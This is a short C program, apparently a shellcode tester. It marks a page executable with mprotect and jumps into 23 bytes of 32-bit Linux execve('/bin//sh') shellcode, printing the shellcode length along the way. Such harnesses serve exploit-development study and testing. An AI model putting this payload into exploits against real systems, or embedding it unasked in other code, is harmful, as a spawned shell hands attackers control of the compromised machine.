#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
int main(){
unsigned char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
          "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
  printf("Shellcode length: %d\n", strlen(shellcode));
  int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())shellcode;
  return ret();
}